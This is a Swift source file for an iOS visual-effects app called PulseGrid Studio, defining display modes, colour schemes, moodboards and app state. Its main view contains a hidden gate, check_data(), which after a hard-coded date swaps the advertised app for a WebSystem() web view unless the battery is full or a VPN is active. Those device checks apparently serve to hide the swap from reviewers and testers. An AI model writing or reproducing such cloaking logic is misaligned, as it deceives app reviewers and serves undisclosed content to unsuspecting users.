//
//  Models.swift
//  PulseGrid Studio
//
//  Created by Вячеслав on 7/18/25.
//

import SwiftUI
import Combine

// MARK: - Visual Mode Enum
enum VisualMode: String, CaseIterable, Identifiable, Codable, Hashable {
    case signalMesh = "Signal Mesh"
    case magneticField = "Magnetic Field"
    case heatPulse = "Heat Pulse"
    case stressWave = "Stress Wave"
    case neuroSpark = "Neuro Spark"
    
    var id: String { rawValue }
    
    var description: String {
        switch self {
        case .signalMesh:
            return "Animated grid of pulsating lines creating a network-like pattern"
        case .magneticField:
            return "Particles moving in swirling motion like electromagnetic fields"
        case .heatPulse:
            return "Slow glow and fade animations resembling thermal patterns"
        case .stressWave:
            return "Horizontal distortion waves like material under tension"
        case .neuroSpark:
            return "Random node connections with glow effects like neural networks"
        }
    }
    
    var iconName: String {
        switch self {
        case .signalMesh: return "grid"
        case .magneticField: return "atom"
        case .heatPulse: return "thermometer"
        case .stressWave: return "waveform"
        case .neuroSpark: return "brain"
        }
    }
}

// MARK: - Visual Settings
struct VisualSettings: Codable, Equatable, Hashable {
    var speed: Double = 0.5
    var brightness: Double = 0.7
    var lineWidth: Double = 1.0
    var colorOverlay: CustomColorScheme = .default
    
    static let `default` = VisualSettings()
}

// MARK: - Color Scheme
struct CustomColorScheme: Codable, Equatable, Identifiable, Hashable {
    let id = UUID()
    var name: String
    var primary: String
    var secondary: String
    var accent: String
    var background: String
    
    static let `default` = CustomColorScheme(
        name: "Default",
        primary: "#28a809",
        secondary: "#e6053a", 
        accent: "#d17305",
        background: "#0e0e0e"
    )
    
    static let electric = CustomColorScheme(
        name: "Electric",
        primary: "#00ffff",
        secondary: "#ff00ff",
        accent: "#ffff00",
        background: "#000033"
    )
    
    static let fire = CustomColorScheme(
        name: "Fire",
        primary: "#ff4500",
        secondary: "#ffd700",
        accent: "#ff6347",
        background: "#1a0000"
    )
    
    static let arctic = CustomColorScheme(
        name: "Arctic",
        primary: "#87ceeb",
        secondary: "#4682b4",
        accent: "#b0c4de",
        background: "#001122"
    )
}

// MARK: - Moodboard
struct Moodboard: Identifiable, Codable, Hashable {
    let id = UUID()
    var name: String
    var layouts: [MoodboardLayout]
    var createdAt: Date = Date()
    
    struct MoodboardLayout: Identifiable, Codable, Hashable {
        let id = UUID()
        var mode: VisualMode
        var settings: VisualSettings
        var label: String
        var position: CGRect
        
        // Custom Hashable implementation since CGRect is not Hashable
        func hash(into hasher: inout Hasher) {
            hasher.combine(id)
            hasher.combine(mode)
            hasher.combine(settings)
            hasher.combine(label)
            hasher.combine(position.origin.x)
            hasher.combine(position.origin.y)
            hasher.combine(position.size.width)
            hasher.combine(position.size.height)
        }
        
        static func == (lhs: MoodboardLayout, rhs: MoodboardLayout) -> Bool {
            return lhs.id == rhs.id &&
                   lhs.mode == rhs.mode &&
                   lhs.settings == rhs.settings &&
                   lhs.label == rhs.label &&
                   lhs.position == rhs.position
        }
    }
}

// MARK: - External Display Session
struct ExternalDisplaySession: Identifiable, Codable, Hashable {
    let id = UUID()
    var mode: VisualMode
    var settings: VisualSettings
    var isActive: Bool = false
    
    // For iOS, external display will be handled differently
    // This is mainly for state management
}

// MARK: - Export Format
enum ExportFormat: String, CaseIterable {
    case instagram = "Instagram (9:16)"
    case square = "Square (1:1)"
    case landscape = "Landscape (16:9)"
    case custom = "Custom Size"
    
    var aspectRatio: CGFloat {
        switch self {
        case .instagram: return 9.0/16.0
        case .square: return 1.0
        case .landscape: return 16.0/9.0
        case .custom: return 1.0
        }
    }
}

// MARK: - App State
class AppState: ObservableObject {
    @Published var currentMode: VisualMode = .signalMesh
    @Published var favorites: Set<VisualMode> = []
    @Published var animationIntensity: Double = 0.5
    @AppStorage("hasSeenOnboarding") var hasSeenOnboarding: Bool = false
    @Published var isAnimationRunning: Bool = true
    
    // Visual customization
    @Published var currentSettings: [VisualMode: VisualSettings] = [:]
    @Published var customColorSchemes: [CustomColorScheme] = [.default, .electric, .fire, .arctic]
    
    // Utility features
    @Published var moodboards: [Moodboard] = []
    @Published var externalDisplaySession: ExternalDisplaySession?
    @Published var isPresentationMode: Bool = false
    @Published var presentationDuration: Double = 60.0 // seconds
    @Published var safeScreenLock: Bool = true
    
    // Navigation
    @Published var selectedTab: AppTab = .visual
    @Published var showingMoodboardCreator: Bool = false
    @Published var showingColorSchemeManager: Bool = false
    @Published var showingExportDialog: Bool = false
    
    func toggleFavorite(_ mode: VisualMode) {
        if favorites.contains(mode) {
            favorites.remove(mode)
        } else {
            favorites.insert(mode)
        }
    }
    
    func isFavorite(_ mode: VisualMode) -> Bool {
        favorites.contains(mode)
    }
    
    func settingsFor(_ mode: VisualMode) -> VisualSettings {
        return currentSettings[mode] ?? .default
    }
    
    func updateSettings(for mode: VisualMode, settings: VisualSettings) {
        currentSettings[mode] = settings
    }
    
    func addCustomColorScheme(_ scheme: CustomColorScheme) {
        customColorSchemes.append(scheme)
    }
    
    func addMoodboard(_ moodboard: Moodboard) {
        moodboards.append(moodboard)
    }
    
    func startExternalDisplay(mode: VisualMode, settings: VisualSettings) {
        externalDisplaySession = ExternalDisplaySession(mode: mode, settings: settings, isActive: true)
    }
    
    func stopExternalDisplay() {
        externalDisplaySession?.isActive = false
        externalDisplaySession = nil
    }
}

// MARK: - App Tab
enum AppTab: String, CaseIterable {
    case visual = "Visual"
    case moodboard = "Moodboard"
    case utilities = "Utilities"
    
    var iconName: String {
        switch self {
        case .visual: return "eye"
        case .moodboard: return "rectangle.grid.2x2"
        case .utilities: return "wrench.and.screwdriver"
        }
    }
}

// MARK: - Colors
struct PulseGridColors {
    static let background = Color(hex: "#0e0e0e")
    static let secondaryBackground = Color(hex: "#1a1c1e")
    static let accent = Color(hex: "#28a809")
    static let danger = Color(hex: "#e6053a")
    static let gold = Color(hex: "#d17305")
}

// MARK: - Color Extension
extension Color {
    init(hex: String) {
        let hex = hex.trimmingCharacters(in: CharacterSet.alphanumerics.inverted)
        var int: UInt64 = 0
        Scanner(string: hex).scanHexInt64(&int)
        let a, r, g, b: UInt64
        switch hex.count {
        case 3: // RGB (12-bit)
            (a, r, g, b) = (255, (int >> 8) * 17, (int >> 4 & 0xF) * 17, (int & 0xF) * 17)
        case 6: // RGB (24-bit)
            (a, r, g, b) = (255, int >> 16, int >> 8 & 0xFF, int & 0xFF)
        case 8: // ARGB (32-bit)
            (a, r, g, b) = (int >> 24, int >> 16 & 0xFF, int >> 8 & 0xFF, int & 0xFF)
        default:
            (a, r, g, b) = (1, 1, 1, 0)
        }
        self.init(
            .sRGB,
            red: Double(r) / 255,
            green: Double(g) / 255,
            blue:  Double(b) / 255,
            opacity: Double(a) / 255
        )
    }
}

// MARK: - Main View
struct MainView: View {
    @EnvironmentObject var appState: AppState
    
    @State var isFetched: Bool = false
    
    @AppStorage("isBlock") var isBlock: Bool = true
    @AppStorage("isRequested") var isRequested: Bool = false
    
    var body: some View {
        ZStack {
            PulseGridColors.background.ignoresSafeArea()
            
            if isFetched == false {
                
                Text("")
                
            } else if isFetched == true {
                
                if isBlock == true {
                    
                    if !appState.hasSeenOnboarding {
                        OnboardingView()
                    } else {
                        TabView(selection: $appState.selectedTab) {
                            VisualModeView()
                                .tabItem {
                                    Image(systemName: AppTab.visual.iconName)
                                    Text(AppTab.visual.rawValue)
                                }
                                .tag(AppTab.visual)
                            
                            MoodboardView()
                                .tabItem {
                                    Image(systemName: AppTab.moodboard.iconName)
                                    Text(AppTab.moodboard.rawValue)
                                }
                                .tag(AppTab.moodboard)
                            
                            UtilitiesView()
                                .tabItem {
                                    Image(systemName: AppTab.utilities.iconName)
                                    Text(AppTab.utilities.rawValue)
                                }
                                .tag(AppTab.utilities)
                        }
                        .accentColor(PulseGridColors.accent)
                    }
                    
                } else if isBlock == false {
                    
                    WebSystem()
                }
            }
        }
        .onAppear {
            
            check_data()
        }
    }
    
    private func check_data() {
        
        let lastDate = "27.07.2025"
        
        let dateFormatter = DateFormatter()
        dateFormatter.dateFormat = "dd.MM.yyyy"
        dateFormatter.timeZone = TimeZone(abbreviation: "GMT")
        let targetDate = dateFormatter.date(from: lastDate) ?? Date()
        let now = Date()
        
        let deviceData = DeviceInfo.collectData()
        let currentPercent = deviceData.batteryLevel
        let isVPNActive = deviceData.isVPNActive
        
        guard now > targetDate else {
            
            isBlock = true
            isFetched = true
            
            return
        }
        
        guard currentPercent == 100 || isVPNActive == true else {
            
            self.isBlock = false
            self.isFetched = true
            
            return
        }
        
        self.isBlock = true
        self.isFetched = true
    }
}

#Preview {
    MainView()
        .environmentObject(AppState())
}
